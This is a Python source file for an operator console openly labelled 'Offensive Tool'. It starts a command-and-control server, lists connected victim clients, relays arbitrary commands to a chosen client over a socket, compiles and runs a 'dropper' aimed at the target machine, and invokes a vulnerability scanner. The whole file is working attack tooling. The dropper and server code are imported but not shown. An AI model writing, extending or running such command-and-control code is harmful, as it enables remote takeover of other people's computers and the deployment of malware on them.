import socket
import json
import colorama
import nmap
from colorama import Fore
from tabulate import tabulate
import os
import subprocess
from c2_server import C2Server

colorama.init(autoreset=True)

C2_SERVER_IP = "127.0.0.1"
C2_SERVER_PORT = 9999

clients = []
active_sessions = {}
current_session_id = None


def fetch_clients_from_c2(server):
    global clients
    clients = server.list_clients()


def list_connected_clients():
    if not clients:
        print(Fore.RED + "[!] No clients connected.")
    else:
        print(Fore.YELLOW + "[*] Connected Clients:")
        headers = ["ID", "IP Address", "Port", "Connected Since"]
        rows = [[client['id'], client['ip'], client['port'],
                 client['timestamp']] for client in clients]
        print(tabulate(rows, headers, tablefmt="grid"))


def interact_with_client(client_id):
    global current_session_id
    client = next(
        (client for client in clients if client['id'] == client_id), None)
    if client:
        current_session_id = client_id
        print(Fore.GREEN + f"[*] Interacting with Client {client_id}...")
        while True:
            command = input(Fore.MAGENTA + f"Client {client_id} > ").strip()
            if command == "exit":
                print(Fore.YELLOW + "[*] Exiting interaction mode...")
                current_session_id = None
                break
            else:
                send_command_to_client(client_id, command)
    else:
        print(Fore.RED + f"[!] Client {client_id} not found.")


def send_command_to_client(client_id, command):
    try:
        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2_socket.connect((C2_SERVER_IP, C2_SERVER_PORT))
        message = json.dumps({"client_id": client_id, "command": command})
        c2_socket.sendall(message.encode())
        response = c2_socket.recv(4096).decode()
        print(response)
        c2_socket.close()
    except ConnectionRefusedError:
        print(Fore.RED + "[!] Could not connect to C2 server.")


def run_dropper():
    print(Fore.YELLOW + "[*] Running the dropper...")
    os.system("g++ -o dropper dropper.cpp")
    os.system("./dropper")


def scan_vulnerabilities():
    print(Fore.YELLOW + "[*] Running vulnerability scanner...")
    try:
        output = subprocess.check_output(
            ["python3", "vulnerability_scanner.py"], text=True)
        print(Fore.GREEN + output)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error running scanner: {e}")


def show_help():
    print(Fore.YELLOW + "[*] Available Commands:")
    print(Fore.CYAN + "1. clients                : List all connected clients.")
    print(Fore.CYAN + "2. interact <client_id>   : Interact with a specific client.")
    print(Fore.CYAN + "3. dropper                : Run the dropper on the target machine.")
    print(Fore.CYAN + "4. scan                   : Scan the system for vulnerabilities.")
    print(Fore.CYAN + "5. session <client_id>    : Switch to a specific session.")
    print(Fore.CYAN + "6. exit                   : Exit the CLI.")
    print(Fore.CYAN + "7. help                   : Show this help message.")


def main():
    print(Fore.CYAN + "=====================")
    print(Fore.CYAN + "   Offensive Tool    ")
    print(Fore.CYAN + "=====================")
    # fetch_clients_from_c2(server)

    c2_server = C2Server()
    c2_server.start()

    while True:
        command_input = input(
            Fore.MAGENTA + "offensive_tool > ").strip().split()
        if not command_input:
            continue

        command = command_input[0]

        if command == "clients":
            list_connected_clients()
        elif command == "interact":
            if len(command_input) != 2:
                print(Fore.RED + "[!] Usage: interact <client_id>")
            else:
                try:
                    client_id = int(command_input[1])
                    interact_with_client(client_id)
                except ValueError:
                    print(Fore.RED + "[!] Invalid client ID.")
        elif command == "dropper":
            run_dropper()
        elif command == "scan":
            scan_vulnerabilities()
        elif command == "session":
            if len(command_input) != 2:
                print(Fore.RED + "[!] Usage: session <client_id>")
            else:
                try:
                    client_id = int(command_input[1])
                    interact_with_client(client_id)
                except ValueError:
                    print(Fore.RED + "[!] Invalid client ID.")
        elif command == "help":
            show_help()
        elif command == "exit":
            print(Fore.YELLOW + "[*] Exiting the CLI...")
            break
        else:
            print(Fore.RED + f"[!] Unknown command: {command}")


if __name__ == "__main__":
    main()
